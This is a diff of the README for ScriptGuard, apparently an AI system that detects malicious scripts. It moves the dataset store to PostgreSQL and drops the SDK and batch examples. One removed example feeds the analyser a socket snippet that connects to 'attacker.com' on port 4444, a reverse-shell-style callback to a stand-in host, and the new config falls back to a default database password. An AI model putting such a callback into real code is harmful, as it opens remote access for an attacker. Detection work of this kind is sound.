@@ -7,8 +7,8 @@ ScriptGuard is an advanced AI-powered system designed to detect malicious and da
 - **Multi-Source Data Collection**: GitHub, MalwareBazaar, Hugging Face, CVE Feeds
 - **Advanced Preprocessing**: Syntax validation, quality filtering, feature extraction
 - **Intelligent Augmentation**: Code obfuscation, polymorphic variant generation
-- **Database Management**: SQLite-based dataset versioning and deduplication
-- **Production-Ready**: FastAPI inference, Docker deployment, monitoring
+- **Database Management**: PostgreSQL-based dataset versioning and deduplication
+- **Production-Ready**: FastAPI inference, Docker deployment, RAG with Qdrant
 
 ## 🏗️ Architecture
 
@@ -174,7 +174,13 @@ data_sources:
     max_samples: 10000
 
 database:
-  path: "./data/scriptguard.db"
+  type: "postgresql"
+  postgresql:
+    host: ${POSTGRES_HOST:-localhost}
+    port: ${POSTGRES_PORT:-5432}
+    database: ${POSTGRES_DB:-scriptguard}
+    user: ${POSTGRES_USER:-scriptguard}
+    password: ${POSTGRES_PASSWORD:-scriptguard}
 
 training:
   model_id: "bigcode/starcoder2-3b"
@@ -205,7 +211,7 @@ Start inference API:
 docker-compose -f docker/docker-compose.yml up --build
 
 # Or directly
-uvicorn scriptguard.api.inference:app --host 0.0.0.0 --port 8000
+uvicorn scriptguard.api.main:app --host 0.0.0.0 --port 8000
 ```
 
 ## 📖 Usage Examples
@@ -229,37 +235,6 @@ Response:
   "dangerous_patterns": ["os.system"],
   "explanation": "Uses os.system for dangerous command execution"
 }
-```
-
-### Python SDK
-
-```python
-from scriptguard.inference import ScriptGuardInference
-
-# Initialize
-analyzer = ScriptGuardInference(model_path="./models/scriptguard-model")
-
-# Analyze code
-result = analyzer.analyze("""
-import socket
-s=socket.socket()
-s.connect(('attacker.com',4444))
-""")
-
-print(f"Label: {result['label']}")
-print(f"Confidence: {result['confidence']:.2%}")
-print(f"Risk Score: {result['risk_score']}/10")
-```
-
-### Batch Analysis
-
-```python
-# Analyze directory
-results = analyzer.analyze_directory("./scripts/", recursive=True)
-
-# Filter malicious
-malicious = [r for r in results if r['label'] == 'malicious']
-print(f"Found {len(malicious)} malicious scripts")
 ```
 
 ## 📚 Documentation
@@ -302,18 +277,14 @@ Generates polymorphic variants using:
 ```python
 from scriptguard.database import DatasetManager
 
-db = DatasetManager("./data/scriptguard.db")
+db = DatasetManager() # Reads from config.yaml
 
 # View statistics
 stats = db.get_dataset_stats()
 print(f"Total samples: {stats['total']}")
-print(f"Balance ratio: {stats['balance_ratio']:.2f}")
 
 # Create version snapshot
 db.create_version_snapshot("v1.0")
-
-# Export dataset
-db.export_to_jsonl("dataset_v1.jsonl")
 ```
 
 ## 📊 Performance
